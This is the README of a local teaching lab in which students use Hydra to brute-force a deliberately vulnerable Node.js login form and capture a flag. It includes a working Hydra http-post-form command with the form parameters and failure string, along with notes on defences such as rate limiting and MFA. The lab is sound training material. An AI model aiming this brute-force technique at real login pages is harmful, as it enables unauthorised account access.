# 🔐 Hydra Web Login Brute-Force Lab (AyedCTF)

A simple vulnerable web login designed for teaching **HTTP POST authentication**, **web enumeration**, and **Hydra brute-forcing** in a safe controlled lab.

---

## 🎯 Objectives

- Understand how a login form sends data using **HTTP POST**
- Learn how to extract form **parameters**, **action**, and **error message**
- Perform a targeted brute-force attack using **Hydra**
- Retrieve the hidden user flag after a successful login

---

## 📦 Project Structure

```

Hydra-Web-Login-Lab/
│── server.js
│── package.json
│── pass.txt
│── setup_web_lab.sh
│── flags/
│     ├── user.txt
│     └── admin.txt
│── public/
│     └── login.html

````

---

## ⚙️ Setup

Run the setup script:

```bash
chmod +x setup_web_lab.sh
./setup_web_lab.sh
````

This will automatically:

* Install Node.js (if missing)
* Create all directories
* Install required dependencies
* Generate flags
* Create a small Hydra wordlist

---

## 🚀 Start the Lab

```bash
cd Hydra-Web-Login-Lab
node server.js
```

Open in browser:

```
http://localhost:3000/login.html
```

---

## 🧪 Web Form Details

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=<value>&password=<value>
```

| Parameter        | Value                  |
| ---------------- | ---------------------- |
| **Method**       | POST                   |
| **Path**         | `/login`               |
| **Fields**       | `username`, `password` |
| **Fail Message** | `Invalid credentials`  |
| **Port**         | 3000                   |

---

## 🐉 Hydra Command

```bash
hydra -l victim -P pass.txt localhost -s 3000 \
http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

Explanation:

* `-l victim` → username
* `-P pass.txt` → password list
* `localhost -s 3000` → target server
* `http-post-form` → brute-force a POST login
* `"Invalid credentials"` → text returned when login fails

---

## 🎁 Flags

| File              | Description                      |
| ----------------- | -------------------------------- |
| `flags/user.txt`  | Retrieved after successful login |
| `flags/admin.txt` | For extended scenarios           |

*Students should never open flags manually — only through the lab flow.*

---

## 👨‍🏫 Instructor Notes

Teach students:

* How POST forms work
* Why parameter names matter
* How attackers identify login weaknesses
* Why rate limiting and lockout policies are critical
* How Hydra automates brute-force attempts

---

## 🛡️ Defense Best Practices

* Strong password policies
* Multi-factor authentication
* Rate-limiting & IP throttling
* CAPTCHA
* Lockout mechanisms
* Web Application Firewall (WAF)
* Logging & alerting failed attempts

---

## ⚠️ Disclaimer

This lab is for **educational use only**.
Do **NOT** use Hydra or brute-forcing on systems you do not own.
